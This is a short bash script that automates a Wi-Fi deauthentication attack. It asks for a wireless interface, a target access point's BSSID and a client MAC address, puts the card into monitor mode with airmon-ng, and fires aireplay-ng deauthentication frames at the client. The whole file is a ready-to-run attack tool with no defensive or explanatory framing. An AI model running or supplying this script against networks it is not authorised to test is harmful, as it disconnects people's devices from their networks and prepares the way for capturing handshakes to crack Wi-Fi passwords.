#!/bin/bash

# Ask for interface name
read -p "Enter your wireless interface name: " interface

# Ask for BSSID (Access Point MAC)
read -p "Enter BSSID (Access Point MAC address): " bssid

# Ask for Client MAC
read -p "Enter Client MAC address: " client_mac

# Turn off interface
airmon-ng stop "$interface" > /dev/null 2>&1

# Start interface in monitor mode
monitor_interface=$(airmon-ng start "$interface" | grep -oE "([a-zA-Z0-9]+mon)")

# Run aireplay-ng for deauthentication
aireplay-ng -0 1 -a "$bssid" -c "$client_mac" "$monitor_interface" &

# Wait for 1 minute
sleep 60

# Kill aireplay-ng
pkill aireplay-ng

# Turn off monitor mode
airmon-ng stop "$monitor_interface" > /dev/null 2>&1
